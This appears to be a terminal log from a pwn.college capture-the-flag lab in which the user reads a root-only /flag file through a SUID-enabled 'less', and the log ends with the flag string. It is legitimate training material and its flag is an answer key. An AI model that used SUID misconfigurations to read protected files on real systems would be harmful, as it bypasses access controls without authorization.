```bash
hacker@program-misuse-level-3:~$ ls
Desktop
hacker@program-misuse-level-3:~$ cd /
hacker@program-misuse-level-3:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-3:/$ ls -l flag
-r-------- 1 root root 57 Dec 30 16:18 flag
hacker@program-misuse-level-3:/$ cd challenge/
hacker@program-misuse-level-3:/challenge$ ls
babysuid_level3
hacker@program-misuse-level-3:/challenge$ ./babysuid_level3 
Welcome to ./babysuid_level3!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/less.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level3) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/less!
hacker@program-misuse-level-3:/challenge$ which less
/usr/bin/less
hacker@program-misuse-level-3:/challenge$ ls -l /usr/bin/less
-rwsr-xr-x 1 root root 180064 Jul  1  2020 /usr/bin/less
hacker@program-misuse-level-3:/challenge$ less /flag

[1]+  Stopped                 less /flag
hacker@program-misuse-level-3:/challenge$ 
```

```
The flag is
pwn.college{QX7WVVqCIhQf-TilMFmwtHFFUBO.0VN0EDL0AjNzQzW}
```